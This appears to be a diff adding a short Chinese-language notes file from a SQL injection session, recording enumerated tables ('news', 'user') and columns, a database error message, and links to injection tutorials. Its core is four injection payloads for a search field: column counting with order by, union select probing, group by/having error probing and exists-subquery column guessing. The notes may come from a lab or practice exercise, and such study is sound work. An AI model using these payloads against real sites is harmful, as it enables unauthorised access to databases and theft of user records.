@@ -1,0 +1,24 @@
+数据库名：？
+表数：？
+
+表名：news 
+列：time title full_text
+字段数：3
+
+
+表名：user
+
+
+
+%' order by 3 --'
+%' union SELECT null,null,null --'
+%' group by 已爆字段 having 1=1--'
+%' and exists(select 猜字段 from user) --+'
+------------------------------------------------------------------------------------------
+提示：表“*SELECT* 1”中有一个名为“time”的列，但不能从查询的这一部分引用
+
+https://cloud.tencent.com/developer/article/1629829
+https://www.cnblogs.com/lxfweb/p/12675023.html
+https://www.cnblogs.com/-mo-/p/1273068
+
+mssql报错注入=https://cloud.tencent.com/developer/article/1629829
